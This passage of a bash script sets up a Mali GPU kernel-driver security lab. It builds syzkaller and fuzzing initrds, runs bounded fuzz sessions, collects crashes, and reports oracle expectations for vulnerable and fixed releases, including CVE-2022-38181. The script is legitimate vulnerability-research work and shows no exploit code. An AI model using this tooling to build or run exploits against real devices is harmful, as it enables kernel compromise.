    cp "$SZ/bin/linux_arm64/syz-execprog" "$SZ/bin/syz-execprog" 2>/dev/null || true
  else
    ( cd "$SZ" && make executor ) >> "$LAB_ROOT/logs/bootstrap/syz_make.log" 2>&1 \
      || fail "executor build failed"
    gate "syzkaller: executor is static-pie" \
      bash -c "file '$SZ/bin/linux_amd64/syz-executor' | grep -q static-pie"
    cp "$SZ/bin/linux_amd64/syz-execprog" "$SZ/bin/syz-execprog" 2>/dev/null || true
  fi
  gate "syzkaller: manager/repro/execprog/prog2c built" test -x "$SZ/bin/syz-manager"

  # initrd for fuzzing guests: x86_64 module mode repacks the staged (x86)
  # syz initrd with the driver .ko; arm64 always builds a fresh initrd
  # (staged syz-builder.cpio is x86-only)
  local syz_initrd="$STAGING_DIR/syz-builder.cpio"
  if [ "$ARCH" = arm64 ]; then
    syz_initrd="$LAB_ROOT/images/syz-builder-mali-arm64.cpio"
    build_arm64_syz_initrd "$syz_initrd"
  elif [ "$DRIVER_MODE" = module ]; then
    syz_initrd="$LAB_ROOT/images/syz-builder-mali.cpio"
    repack_syz_initrd "$syz_initrd"
  fi

  # bounded startup probe (F5 lesson: no writes into $SZ while manager runs)
  local cfg="$LAB_ROOT/fuzzing/syzkaller/syz-probe-$dshort.cfg"
  write_syz_cfg "$cfg" "$dshort" 56755 "workdir-probe-$dshort" "$syz_initrd"
  log "probe: starting manager for 45s"
  timeout --kill-after=10 45 "$SZ/bin/syz-manager" -config "$cfg" \
    > "$LAB_ROOT/logs/bootstrap/syz_probe.log" 2>&1 || true
  gate "syzkaller: probe has no FATAL/mismatching-description" \
    bash -c "! grep -qiE 'FATAL|mismatching' '$LAB_ROOT/logs/bootstrap/syz_probe.log'"
  # enabled-syscalls count: hard pins for the characterized releases;
  # r36p0/r36p0_csf observed-and-recorded (count not yet pinned — first
  # codespace run will pin it as evidence)
  local plog="$LAB_ROOT/logs/bootstrap/syz_probe.log"
  case "$dshort" in
    r28p0)
      gate "syzkaller: probe enabled-syscalls count (53/8328)" \
        grep -q "syscalls *: 53/8328" "$plog";;
    r41p0)
      gate "syzkaller: probe enabled-syscalls count (40/8328)" \
        grep -q "syscalls *: 40/8328" "$plog";;
    r36p0|r36p0_csf)
      local observed; observed=$(grep -o "syscalls *: [0-9]*/8328" "$plog" | head -1 || true)
      gate_soft "syzkaller: probe enabled-syscalls count observed (${observed:-none}) — r36p0 count not yet pinned" \
        test -n "$observed"
      note "r36p0 probe observed: ${observed:-none} (recorded in probe log; hard pin deferred)";;
  esac
  gate "syzkaller: probe executed programs (guest+executor alive)" \
    bash -c "grep -q 'exec total' '$plog'"
  set_stamp syzkaller "$dshort|$ARCH|$(sha256sum "$SZ/sys/linux/dev_mali_$dshort.txt.const" | awk '{print $1}')"
  log "syzkaller stage done (panel was on the probe cfg's http port during the probe)"
}

repack_syz_initrd() { # <out> — original (x86) syz initrd + driver .ko + insmod hook
  local out="$1" tmp="$LAB_ROOT/images/syz_initrd_stage"
  local short; short=$(drv_short "$DRIVER_VERSION")
  rm -rf "$tmp"; mkdir -p "$tmp"
  ( cd "$tmp" && cpio -idm < "$STAGING_DIR/syz-builder.cpio" >/dev/null 2>&1 ) \
    || fail "syz-builder.cpio extraction failed"
  cp "$LAB_ROOT/builds/modules/mali_kbase_${short}.ko" "$tmp/mali_kbase.ko"
  [ -f "$tmp/init" ] || fail "syz initrd has no /init — cannot add insmod hook"
  head -1 "$tmp/init" | grep -q '^#!' \
    || fail "syz initrd /init is not a script (line 1: $(head -1 "$tmp/init")) — refusing to inject insmod"
  if ! grep -q mali_kbase.ko "$tmp/init"; then
    sed -i '1a insmod /mali_kbase.ko 2>/dev/null; echo "mali insmod rc=$?"' "$tmp/init"
  fi
  python3 "$LAB_ROOT/scripts/repack_initrd.py" "$tmp" "$out" \
    || fail "repack_initrd.py failed"
  gate "syzkaller: repacked syz initrd with driver .ko" test -s "$out"
}

build_arm64_syz_initrd() { # <out> — fresh aarch64 fuzz initrd (staged
                           # syz-builder.cpio is x86-only): static busybox +
                           # dropbear, same init contract as the x86 guest
  local out="$1" tmp="$LAB_ROOT/images/syz_initrd_stage_arm64"
  local short; short=$(drv_short "$DRIVER_VERSION")
  local tc="$LAB_ROOT/toolchains/arm64"
  rm -rf "$tmp"
  mkdir -p "$tmp"/{bin,sbin,etc/dropbear,root/.ssh,verif,proc,sys,dev,tmp,var/run}

  cp "$tc/busybox" "$tmp/bin/busybox"
  local l
  for l in sh mount umount ls cat grep head tail dmesg poweroff mkdir chmod \
           sleep insmod rmmod uname echo sync wc printf zcat ifconfig route \
           hostname mdev killall ps; do
    ln -sf busybox "$tmp/bin/$l"
  done
  cp "$tc/dropbear" "$tc/dropbearkey" "$tmp/sbin/"
  chmod 0755 "$tmp/bin/busybox" "$tmp/sbin/dropbear" "$tmp/sbin/dropbearkey"

  # minimal /etc (dropbear needs a passwd entry for root)
  printf 'root:x:0:0:root:/root:/bin/sh\n' > "$tmp/etc/passwd"
  printf 'root:x:0:\n'                      > "$tmp/etc/group"
  printf '127.0.0.1 localhost\n'             > "$tmp/etc/hosts"

  # ssh access for syz-manager: authorized_keys matching the staged keypair
  if [ -f "$STAGING_DIR/syz-host.key.pub" ]; then
    cp "$STAGING_DIR/syz-host.key.pub" "$tmp/root/.ssh/authorized_keys"
  else
    ssh-keygen -y -f "$STAGING_DIR/syz-host.key" > "$tmp/root/.ssh/authorized_keys" \
      || fail "cannot derive syz-host.key.pub (install openssh-client or stage syz-host.key.pub)"
  fi
  chmod 0700 "$tmp/root/.ssh"; chmod 0600 "$tmp/root/.ssh/authorized_keys"
  gate "syzkaller: arm64 initrd authorized_keys non-empty" test -s "$tmp/root/.ssh/authorized_keys"

  # module mode: driver .ko at the /verif hook the init script probes
  if [ "$DRIVER_MODE" = module ]; then
    cp "$LAB_ROOT/builds/modules/mali_kbase_${short}.ko" "$tmp/verif/mali_kbase.ko" \
      || fail "driver module missing for arm64 initrd (run driver stage)"
  fi

  # same init contract as the validated x86 fuzz guest (arch-neutral shell)
  cat > "$tmp/init" <<'EOF_SYZINIT'
#!/bin/busybox sh
export PATH=/sbin:/bin
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs devtmpfs /dev 2>/dev/null || true
mkdir -p /dev/pts /dev/shm
mount -t devpts devpts /dev/pts 2>/dev/null || true
mkdir -p /sys/kernel/debug
mount -t debugfs nodev /sys/kernel/debug 2>/dev/null || true
mount -t tmpfs none /var 2>/dev/null || true
mount -t tmpfs none /run 2>/dev/null || true
echo "=== mali-arm64 fuzz init ==="
hostname syz-guest
ifconfig lo 127.0.0.1 up 2>/dev/null || true
ifconfig eth0 10.0.2.15 netmask 255.255.255.0 up 2>/dev/null || true
route add default gw 10.0.2.1 2>/dev/null || true
if [ ! -e /dev/mali0 ]; then
    mdev -s 2>/dev/null || true
fi
if [ ! -e /dev/mali0 ] && [ -f /verif/mali_kbase.ko ]; then
    echo "loading mali_kbase.ko"
    insmod /verif/mali_kbase.ko 2>&1 | head -5
    mdev -s 2>/dev/null || true
fi
ls -la /dev/mali0 2>/dev/null || echo "/dev/mali0 ABSENT"
# sshd (dropbear): host key on first boot
[ -f /etc/dropbear/dropbear_ed25519_host_key ] || \
    dropbearkey -t ed25519 -f /etc/dropbear/dropbear_ed25519_host_key 2>/dev/null
[ -f /etc/dropbear/dropbear_rsa_host_key ] || \
    dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key 2>/dev/null
[ -f /etc/dropbear/dropbear_ecdsa_host_key ] || \
    dropbearkey -t ecdsa -f /etc/dropbear/dropbear_ecdsa_host_key 2>/dev/null
mkdir -p /var/run
echo "starting dropbear on :22"
/sbin/dropbear -E -p 22 2>&1 &
echo "=== mali-arm64 ready (fuzz guest) ==="
exec sh -c 'while true; do sleep 3600; done'
EOF_SYZINIT
  chmod 0755 "$tmp/init"
  python3 "$LAB_ROOT/scripts/repack_initrd.py" "$tmp" "$out" \
    || fail "repack_initrd.py failed (arm64 syz initrd)"
  gate "syzkaller: arm64 syz initrd built" test -s "$out"
  gate "syzkaller: arm64 initrd busybox/dropbear are aarch64" \
    bash -c "file '$tmp/bin/busybox' | grep -q aarch64 && file '$tmp/sbin/dropbear' | grep -q aarch64"
}

write_syz_cfg() { # <cfg> <dshort> <httpport> <workdirname> <initrd> — fully
                  # generative; field semantics mirror the validated Phase
                  # E/F cfgs (enable_syscalls derived from the active desc:
                  # every syscall-variant line name$Variant — validated
                  # 54=54 vs both payload cfgs)
  local cfg="$1" dshort="$2" port="$3" wd="$4" initrd="$5"
  local target kimg cmdline qemu_args=""
  if [ "$ARCH" = arm64 ]; then
    target="linux/arm64"
    kimg="$KT/arch/arm64/boot/Image"
    cmdline="console=ttyAMA0 panic=-1 nokaslr acpi=off"
    # qemu_args REPLACES the syzkaller arch defaults (config.LoadData
    # overwrites archConfig.QemuArgs) → carry the full machine+cpu string
    # plus -dtb (same DTB the kernel stage gates and boot_guest uses)
    qemu_args=",\n    \"qemu_args\": \"-machine virt,virtualization=on,gic-version=max -cpu max,sve128=on,pauth=off -dtb $LAB_ROOT/images/virt_mali.dtb\""
  else
    target="linux/amd64"
    kimg="$KT/arch/x86/boot/bzImage"
    cmdline="console=ttyS0 panic=-1 nokaslr"
  fi
  local enables="" sep="" s
  while IFS= read -r s; do
    [ -n "$s" ] || continue
    enables+="$sep\"$s\""; sep=", "
  done < <(grep -oE '^[a-z][a-z0-9_]*\$[A-Za-z0-9_]+' "$SZ/sys/linux/dev_mali_$dshort.txt" | LC_ALL=C sort -u)
  [ -n "$enables" ] || fail "write_syz_cfg: no syscall variants derived from dev_mali_$dshort.txt"
  {
    printf '{\n'
    printf '  "target": "%s",\n' "$target"
    printf '  "syzkaller": "%s",\n' "$SZ"
    printf '  "http": "127.0.0.1:%s",\n' "$port"
    printf '  "workdir": "%s/fuzzing/syzkaller/%s",\n' "$LAB_ROOT" "$wd"
    printf '  "kernel_obj": "%s",\n' "$KT"
    printf '  "kernel_src": "%s",\n' "$KT"
    printf '  "image": "%s",\n' "$STAGING_DIR/empty.img"
    printf '  "sshkey": "%s",\n' "$STAGING_DIR/syz-host.key"
    printf '  "ssh_user": "root",\n'
    printf '  "procs": 1,\n'
    printf '  "sandbox": "none",\n'
    printf '  "cover": true,\n'
    printf '  "type": "qemu",\n'
    printf '  "vm": {\n'
    printf '    "count": 1,\n'
    printf '    "cpu": 2,\n'
    printf '    "mem": 2048,\n'
    printf '    "kernel": "%s",\n' "$kimg"
    printf '    "initrd": "%s",\n' "$initrd"
    printf '    "cmdline": "%s"%b\n' "$cmdline" "$qemu_args"
    printf '  },\n'
    printf '  "enable_syscalls": [%s]\n' "$enables"
    printf '}\n'
  } > "$cfg"
  gate "syz cfg ($dshort): valid JSON with derived enable_syscalls" \
    python3 -c "import json; c=json.load(open('$cfg')); assert c['target']=='$target' and c['enable_syscalls']"
}

# ================================ STAGE: FUZZ ================================
stage_fuzz() {
  [ "$FUZZ_MINUTES" -gt 0 ] || { log "fuzz stage skipped (FUZZ_MINUTES=0)"; return 0; }
  local dshort; dshort=$(drv_desc "$DRIVER_VERSION")
  local short; short=$(drv_short "$DRIVER_VERSION")
  log "=== stage fuzz ($FUZZ_MINUTES min, $DRIVER_VERSION, desc=$dshort, arch=$ARCH) ==="
  local syz_initrd="$STAGING_DIR/syz-builder.cpio"
  if [ "$ARCH" = arm64 ]; then
    syz_initrd="$LAB_ROOT/images/syz-builder-mali-arm64.cpio"
  elif [ "$DRIVER_MODE" = module ]; then
    syz_initrd="$LAB_ROOT/images/syz-builder-mali.cpio"
  fi
  gate "fuzz: initrd present" test -s "$syz_initrd"
  local cfg="$LAB_ROOT/fuzzing/syzkaller/syz-fuzz-$short.cfg"
  write_syz_cfg "$cfg" "$dshort" 56756 "workdir-$short" "$syz_initrd"
  # F5 lesson: never touch $SZ while the manager runs — only launch here
  timeout --kill-after=30 $((FUZZ_MINUTES * 60)) "$SZ/bin/syz-manager" -config "$cfg" \
    > "$LAB_ROOT/logs/bootstrap/fuzz_${short}_session.log" 2>&1 || true
  gate "fuzz: session produced stats" \
    bash -c "grep -q 'exec total' '$LAB_ROOT/logs/bootstrap/fuzz_${short}_session.log'"
  grep -E "exec total" "$LAB_ROOT/logs/bootstrap/fuzz_${short}_session.log" | tail -1 \
    | tee "$LAB_ROOT/evidence/fuzz_${short}_final_stats.txt"
  # collect + symbolize crashes
  local wd="$LAB_ROOT/fuzzing/syzkaller/workdir-$short"
  if [ -d "$wd/crashes" ] && [ "$(ls "$wd/crashes" | wc -l)" -gt 0 ]; then
    mkdir -p "$LAB_ROOT/crashes/$short"
    local c
    for c in "$wd"/crashes/*/; do
      cp -a "$c" "$LAB_ROOT/crashes/$short/" 2>/dev/null || true
    done
    for c in "$LAB_ROOT/crashes/$short"/*/report0; do
      [ -f "$c" ] || continue
      "$SZ/bin/syz-symbolize" -obj "$KT" "$c" > "${c%.report0}_symbolized.txt" 2>/dev/null || true
    done
    note "fuzz: $(ls "$wd/crashes" | wc -l) crash dir(s) collected to crashes/$short/"
  else
    note "fuzz: no crashes in this bounded window"
  fi
  GATES+=("PASS  fuzz: bounded session completed")
}

# ================================ STAGE: REPORT ==============================
stage_report() {
  log "=== stage report ==="
  local rep="$LAB_ROOT/evidence/bootstrap_report.md"
  {
    echo "# bootstrap_mali_lab — run report"
    echo
    echo "- date: $(TS)"
    echo "- host: $(uname -srmo)"
    echo "- LAB_ROOT: $LAB_ROOT"
    echo "- ARCH: $ARCH  (arm64 guests boot with the lab DTB: images/virt_mali.dtb)"
    echo "- KERNEL_VERSION: $KERNEL_VERSION  (tree: builds/linux-$KERNEL_VERSION-$ARCH-mali)"
    echo "- DRIVER_VERSION: $DRIVER_VERSION  (+ ${WITH_DRIVERS:-none})"
    echo "- MALI_MODE: $MALI_MODE   (r36p0 UAPI variant: jm|csf)"
    echo "- DRIVER_MODE: $DRIVER_MODE   (kernel built once; per-release driver as .ko)"
    echo "- QEMU accel: ${QEMU_ACCEL:-$(cat "$LAB_ROOT/.stamps/qemu_accel" 2>/dev/null || echo '?')}"
    echo "- FUZZ_MINUTES: $FUZZ_MINUTES"
    echo
    echo "## Gates"
    echo
    local g
    for g in ${GATES[@]+"${GATES[@]}"}; do echo "- $g"; done
    echo
    echo "## Key artifact hashes"
    echo
    echo '```'
    [ -f "$LAB_ROOT/evidence/kimage.sha256" ] && cat "$LAB_ROOT/evidence/kimage.sha256"
    [ -f "$LAB_ROOT/evidence/bzImage.sha256" ] && cat "$LAB_ROOT/evidence/bzImage.sha256"
    [ -f "$LAB_ROOT/evidence/virt_mali.dtb.sha256" ] && cat "$LAB_ROOT/evidence/virt_mali.dtb.sha256"
    [ -f "$LAB_ROOT/evidence/modules.sha256" ] && cat "$LAB_ROOT/evidence/modules.sha256"
    for f in "$LAB_ROOT/fuzzing/syzkaller/syzkaller/sys/linux"/dev_mali_*.txt* \
             "$LAB_ROOT"/images/initramfs_*.cpio.gz \
             "$LAB_ROOT"/builds/modules/*.ko; do
      [ -f "$f" ] && sha256sum "$f"
    done
    echo '```'
    echo
    echo "## Oracle expectations (per evidence/09, evidence/10)"
    echo
    echo "- r28p0-01eac0 (vulnerable): O1 accepted; trigger FOREIGN; trigger-late NOT_ORIG"
    echo "- r29p0-01eac0 (fixed):      O1 rejected (-EINVAL); content INTACT x2"
    echo "- r41p0-01eac0:              boot-only (oracle expectations never characterized)"
    echo "- r36p0-01eac0:              observe-only (CVE-2022-38181 range; oracle not"
    echo "                             yet characterized — review guest_test_r36p0.log)"
    echo
    echo "## Notes"
    echo
    echo "- module mode: guest tests insmod builds/modules/mali_kbase_<ver>.ko;"
    echo "  the kernel image is built once and never rebuilt by driver swaps."
    echo "- builtin mode: exact originally-validated flow (per-release incremental"
    echo "  relink). Fuzz guests use the pristine syz-builder.cpio."
    echo "- KASAN is blind to this UAF class by construction (user-mode PFNMAP"
    echo "  loads of buddy pages); detection = oracle content classification +"
    echo "  KASAN liveness canary in the same guest."
  } > "$rep"
  log "report written: $rep"
  cp "$rep" "$LAB_ROOT/MANIFEST.bootstrap.md" 2>/dev/null || true
}

# ================================ DISPATCH ===================================
usage() { awk 'NR>1 && /^#/{sub(/^# ?/,""); print; next} NR>1{exit}' "$0"; }

main() {
  validate_config
  log "bootstrap_mali_lab: LAB_ROOT=$LAB_ROOT ARCH=$ARCH KERNEL=$KERNEL_VERSION DRIVER=$DRIVER_VERSION MODE=$DRIVER_MODE MALI_MODE=$MALI_MODE"
  mkdir -p "$LAB_ROOT"
  case "$STAGE" in
    payloads)   write_payloads;;
    prereqs)    stage_prereqs;;
    sources)    stage_sources;;
    kernel)     stage_kernel;;
    driver)     stage_driver "$DRIVER_VERSION";;
    guest-test) stage_guest_test "$DRIVER_VERSION";;
    syzkaller)  stage_syzkaller;;
    fuzz)       stage_fuzz;;
    report)     stage_report;;
    all)
      write_payloads
      stage_prereqs
      stage_sources
      stage_kernel
      local dv
      stage_driver "$DRIVER_VERSION"
      stage_guest_test "$DRIVER_VERSION"
      for dv in $(echo "${WITH_DRIVERS:-}" | tr ',' ' '); do
        [ -n "$dv" ] || continue
        stage_driver "$dv"
        stage_guest_test "$dv"
      done
      stage_syzkaller
      stage_fuzz
      stage_report
      log "=== ALL STAGES COMPLETE ==="
      log "gates: $(printf '%s\n' ${GATES[@]+"${GATES[@]}"} | grep -c '^PASS') pass," \
          "$(printf '%s\n' ${GATES[@]+"${GATES[@]}"} | grep -c '^FAIL' || true) fail," \
          "$(printf '%s\n' ${GATES[@]+"${GATES[@]}"} | grep -c '^UNVERIFIED' || true) unverified"
      log "see $LAB_ROOT/evidence/bootstrap_report.md"
      ;;
    *) usage; fail "unknown stage: $STAGE";;
  esac
}

# argument parsing
while [ $# -gt 0 ]; do
  case "$1" in
    all|payloads|prereqs|sources|kernel|driver|guest-test|syzkaller|fuzz|report) STAGE="$1";;
    --with-drivers) WITH_DRIVERS="${2:-}"; shift;;
    --install-prereqs) INSTALL_PREREQS=1;;
    --force) FORCE=1;;
    -h|--help) usage; exit 0;;
    *) usage; echo "unknown arg: $1" >&2; exit 2;;
  esac
  shift
done

main
